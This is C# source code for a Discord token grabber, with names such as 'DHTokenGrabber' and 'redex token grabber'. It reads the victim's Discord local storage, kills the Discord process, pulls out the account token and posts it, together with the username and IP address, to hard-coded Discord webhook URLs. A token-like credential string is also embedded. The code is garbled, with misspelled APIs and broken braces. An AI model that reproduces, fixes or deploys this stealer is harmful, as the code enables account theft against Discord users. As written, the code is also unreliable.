thub.com/NightfallGT/Mercurial-Grabber/releases
https://discord.com/api/webhooks/915293209297551391/KdUf0SEolCuHIeFHIQfzgJkIHbzjKuTGPtuPIwAr6FQPI0rel2fb5j7NO06iCqwxw2CN
staff
namespace DHTokenGrabber
{   
// token: RID: 365 RVA:OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA.7nGgcZJSR9WeJs5c4W7kOSh1wqU file Offset:
internal class program
{

 // token:RID:366 RVA:0x00008888 File Offset:0x000000424
 private static void mai(string[]argvs)
 {  
     string text=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\local storage\\leveldb";
     if(!Grabber.FinLfb(ref text)&& !Grabber.FinLog(ref text))
     {  
         program.SenWH("no valid .ldb or .log file found");
     }
     process[] processesByName= process.GetProcessysByName("Discord");
     for(int i = 0;i < processesByName.Lenght; i++)
     {
         processesByName[i].kill();
     }
     Thread.sleep(100);
     string text2 = Grabber.GetToken(text, text.EndsWith(".log"));
     if(text2 =="")
     {
         text2 = "not found";
     }
     program.SenWH(text2);
 }

 // Token: 0x0600007 RID: 7 RVA: 0x000022B4 File Offset: 0x000004B4
 private static void SenWH(string Token)
 {  
     httpClient httpClient = new httpClient();
     MultiPlataformDataContent MultiPlataformDataContent = new MultiPlataformDataContent(); 
     MultiPlataformDataContent.add(new stringContent("DiscordHaxx Token Grabber"), "username");
     MultiPlataformDataContent.add(new stringContent(OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA7nGgcZJSR9WeJs5c4W7kOSh1wqU), "avatar_url");
     MultiPlataformDataContent.add(new string.Concat(new string[]
{
"Token by"
Environment.username,
" on ",
program.GetIP();
"\r\nResult",
token
"content");
}))),
try 
{
    httpResponseMEssage result = httpClient.PostAsync(settings.WebHook, multiPlataformDataContent).result;
}
catch (Exception)
{
}
 }
 // Token: 0x06000008 RID: 8 RVA: 0x00002368 File Offset: 0x00000568
 private static string GetIP()
 {
     string result;
     try
 }
  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/928799021634555946/9FcAag5KAoQGlh98Vk09m7c10Tunk4HH9PLfsI_6tBsY_1ZSZlZtz9a98Ee2IPR-7GiB").result;
}
catch (WebException)
}
result = "unable to get  IP";
}
return result;
}
}
}   
public static void sendWebHook(string discordWebHook,string content)
{
    try
    {   
        httpClient httpClient = new httpClient();
        Dictionary<string, string> nameValuecollection = new  Dictionary<string, string>
        { 
            {
                "content",
                "´´´" + string.join("\n",new string[]
                {
                    content
                }) + "´´´"
            },
            {
                "⛧♱𝖎𝖇𝖊𝖓𝖑𝖆𝖓𝖉⛧#9921"
                "redex token grabber"
            },
            {
                "avatar_url",
                "https://discord.com/channels/@me/910580649482674176"

            }
        };
        httpClient.PostAsync(WebHook._hookUrl, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
        catch (WebException)
        {
        }
    }
    // token: RID:366 RVA:0x00008888 File Offset:e
    
    
   
